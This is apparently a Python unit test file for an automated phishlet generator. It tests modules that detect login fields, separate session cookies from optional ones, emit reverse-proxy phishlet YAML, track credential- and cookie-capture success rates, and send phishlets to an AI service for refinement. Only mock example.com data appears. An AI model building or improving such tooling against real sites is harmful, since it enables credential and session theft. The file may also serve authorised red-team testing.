#!/usr/bin/env python3
"""
Unit and integration tests for intelligent phishlet generation modules
"""

import unittest
import os
import json
from unittest.mock import patch, MagicMock

# Import modules to be tested (package imports for Pylance)
from phishcreator.modules.auth_flow_classifier import AuthFlowClassifier
from phishcreator.modules.intelligent_credential_extractor import IntelligentCredentialExtractor
from phishcreator.modules.smart_cookie_analyzer import SmartCookieAnalyzer
from phishcreator.modules.dynamic_phishlet_generator import DynamicPhishletGenerator
from phishcreator.modules.self_improvement_engine import SelfImprovementEngine, PhishletTestResult
from phishcreator.modules.ai_phishlet_refiner import AIPhishletRefiner

# Mock traffic data
FORM_BASED_TRAFFIC = {
    'all_requests': [
        {'url': 'https://login.example.com/', 'method': 'GET'},
        {'url': 'https://login.example.com/login', 'method': 'POST', 'headers': {'content-type': 'application/x-www-form-urlencoded'}, 'post_data': 'username=testuser&password=testpass'}
    ],
    'form_submissions': [
        {'url': 'https://login.example.com/login', 'content_type': 'application/x-www-form-urlencoded', 'detected_username_field': 'username', 'detected_password_field': 'password', 'fields': {'username': 'testuser', 'password': 'testpass'}}
    ]
}

API_DRIVEN_TRAFFIC = {
    'all_requests': [
        {'url': 'https://api.example.com/v1/session', 'method': 'POST', 'headers': {'content-type': 'application/json'}, 'post_data': '{"login":"testuser","pass":"testpass"}'}
    ],
    'form_submissions': [
        {'url': 'https://api.example.com/v1/session', 'content_type': 'application/json', 'detected_username_field': 'login', 'detected_password_field': 'pass', 'fields': {'login': 'testuser', 'pass': 'testpass'}}
    ]
}

class TestIntelligentModules(unittest.TestCase):

    def test_auth_flow_classifier(self):
        classifier = AuthFlowClassifier()
        
        # Test form-based classification
        result_form = classifier.classify(FORM_BASED_TRAFFIC)
        self.assertEqual(result_form.primary_type, 'simple_form')
        self.assertGreater(result_form.confidence, 0.7)
        
        # Test API-driven classification
        result_api = classifier.classify(API_DRIVEN_TRAFFIC)
        self.assertEqual(result_api.primary_type, 'api_driven')
        self.assertGreater(result_api.confidence, 0.7)

    def test_credential_extractor(self):
        extractor = IntelligentCredentialExtractor()
        
        # Test form-based extraction
        pattern_form = extractor.extract_credentials(FORM_BASED_TRAFFIC['form_submissions'])
        self.assertEqual(pattern_form.extraction_method, 'form')
        self.assertEqual(pattern_form.username_key, 'username')
        self.assertEqual(pattern_form.password_key, 'password')
        
        # Test JSON-based extraction
        pattern_api = extractor.extract_credentials(API_DRIVEN_TRAFFIC['form_submissions'], observed_username='testuser', observed_password='testpass')
        self.assertEqual(pattern_api.extraction_method, 'json')

    def test_cookie_analyzer(self):
        analyzer = SmartCookieAnalyzer()
        cookies = {
            '.example.com': {
                'session_id': {'httpOnly': True, 'secure': True},
                'tracking_id': {'httpOnly': False, 'secure': False}
            }
        }
        result = analyzer.analyze_cookies(cookies)
        self.assertIn('session_id', result.critical_cookies[0])
        self.assertIn('tracking_id', result.optional_cookies[0])
        self.assertGreater(len(result.auth_tokens), 0)

    def test_dynamic_phishlet_generator(self):
        generator = DynamicPhishletGenerator(target_domain='example.com')
        result = generator.generate(FORM_BASED_TRAFFIC)
        self.assertIn('proxy_hosts', result.phishlet_yaml)
        self.assertIn('credentials', result.phishlet_yaml)
        self.assertGreater(result.confidence, 0.5)

    def test_self_improvement_engine(self):
        db_path = 'test_learning.db'
        if os.path.exists(db_path):
            os.remove(db_path)
            
        engine = SelfImprovementEngine(db_path=db_path)
        test_result = PhishletTestResult(
            phishlet_name='test', 
            target_domain='example.com', 
            auth_type='simple_form', 
            success=True, 
            credential_capture=True, 
            cookie_capture=True
        )
        engine.record_test_result(test_result)
        
        success_rate = engine.get_success_rate('example.com', 'simple_form')
        self.assertEqual(success_rate, 1.0)
        
        os.remove(db_path)

    @patch('phishcreator.modules.ai_phishlet_refiner.requests.post')
    def test_ai_phishlet_refiner(self, mock_post):
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'id': 'task_123', 'url': 'https://manus.im/task/123'}
        mock_post.return_value = mock_response
        
        refiner = AIPhishletRefiner(api_key='test_key')
        result = refiner.refine_phishlet('phishlet_yaml_content')
        
        self.assertTrue(result.success)
        self.assertEqual(result.task_id, 'task_123')

if __name__ == '__main__':
    unittest.main()
